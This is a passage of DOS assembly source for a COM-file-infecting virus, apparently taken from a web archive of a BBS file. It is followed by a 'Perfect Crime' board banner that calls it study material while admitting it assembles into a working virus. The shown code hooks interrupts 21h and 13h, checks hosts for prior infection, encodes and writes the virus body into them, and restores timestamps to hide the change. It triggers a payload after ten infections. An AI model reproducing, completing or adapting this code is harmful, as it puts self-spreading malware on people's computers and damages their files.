              int    2f
              pop    bx

              mov    ax,word ptr es:[di+11]
              cmp    ax,0f000
              jc     mod_8_c
              jmp    mod_8_exit

mod_8_c:
              mov    word ptr es:[di+2],2                  ;open mode - R/W

              mov    ax,es:[di+11]
              mov    cs:fsize,ax               ; save file size

              mov    ax,word ptr es:[di+0dh]   ;
              mov    word ptr cs:[ftime],ax    ; save file date/time
              mov    ax,word ptr es:[di+0f]    ;
              mov    word ptr cs:[fdate],ax    ;

              push   cs                          ;
              pop    ds                          ;
              mov    dx,offset myend+1           ;
              mov    cx,offset myend-100         ; read first bytes
              mov    ah,3f                       ;
              pushf
              call   cs:oldint21
              jnc    mod_8_cnt
              jmp    mod_8_exit

mod_8_cnt:
              mov    bp,ax                       ; ax - bytes read
              mov    si,dx
              mov    ax,'MZ'
              cmp    ax,word ptr ds:[si]
              jne    mod_8_nxtchk
              jmp    mod_8_exit
mod_8_nxtchk:
              xchg   ah,al
              cmp    ax,ds:[si]
              jne    mod_8_cnt2
              jmp    mod_8_exit

mod_8_cnt2:
              push   es
              push   di
              push   cs                          ;
              pop    es                          ;
              mov    si,100                      ;
              mov    di,dx                       ; check for infected file
              mov    cx,0bh                      ;
              repe   cmpsb                       ;
              pop    di
              pop    es
              jne    mod_8_cnt1                  ;
              jmp    mod_8_exit
mod_8_cnt1:
              mov    word ptr es:[di+15],0     ; fp:=0

              push   es
              push   di
              mov    si,word ptr cs:[table+0e]
              add    si,offset mod_8_cont - offset mod_8
              xor    di,di
              push   cs
              pop    es
              mov    cx,offset mod_8_cont_end - offset mod_8_cont
              cld
              rep    movsb
              pop    di
              pop    es

              mov    si,word ptr cs:[table+0e]
              add    si,offset mod_8_cont_end - offset mod_8
              push   si
              xor    si,si
              push   si

              push   ds                          ;
              cli                                ;
              xor    ax,ax                       ;
              mov    ds,ax                       ;
              mov    ax,word ptr cs:[oldint13]   ;
              xchg   ax,word ptr ds:[4*13]       ;
              mov    word ptr cs:[oldint13],ax   ;
              mov    ax,word ptr cs:[oldint13+2] ; exchange int13 vectors
              xchg   ax,word ptr ds:[4*13+2]     ;
              mov    word ptr cs:[oldint13+2],ax ;
              sti                                ;
              pop    ds                          ;

              ret

mod_8_cont:
              push   bx
              call   word ptr cs:[table]         ; code virus
              pop    bx

              mov    dx,100                      ;
              mov    ah,40                       ; write code in begin
              mov    cx,offset myend-0ff
              pushf                              ;
              call   cs:stdint21                 ;

              pushf
              push   bx
              call   word ptr cs:[table]         ; decode virus
              pop    bx
              popf
              jnc    mod_8_cont1
              pop    ax
              mov    ax,word ptr cs:[table+0e]
              add    ax,offset mod_8_ext - offset mod_8
              push   ax
              ret
mod_8_cont1:
              mov    ax,es:[di+11]               ; fp:=end of file
              mov    word ptr es:[di+15],ax      ;

              mov    dx,offset myend+1
              mov    cx,bp                       ; bp - files read
              mov    ah,40                       ;
              pushf                              ;
              call   cs:stdint21                 ; write in end of file

              ret

mod_8_cont_end:
              mov    ax,5701     ;
              mov    cx,cs:ftime ;
              mov    dx,cs:fdate ; restore file date/time
              pushf              ;
              call   cs:oldint21 ;

              inc    cs:files
              cmp    cs:files,0a
              jne    mod_8_ext
              call   word ptr cs:[table+8]
              jmp    short mod_8_ext
mod_8_exit:
              stc
              jmp    short mod_8_ex
mod_8_ext:
              clc
mod_8_ex:
              pop    bp
              pop    di
              pop    es
              pop    ds
              pop    dx
              pop    cx
              ret

;---------------------------------------------------------------

myend         db   0

              int    20                ;code of infected file

false_mod_1:
              mov     word ptr cs:[table],offset mod_1
              ret

code          ends
              end  start

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

</textarea></td></tr></table></body></html>
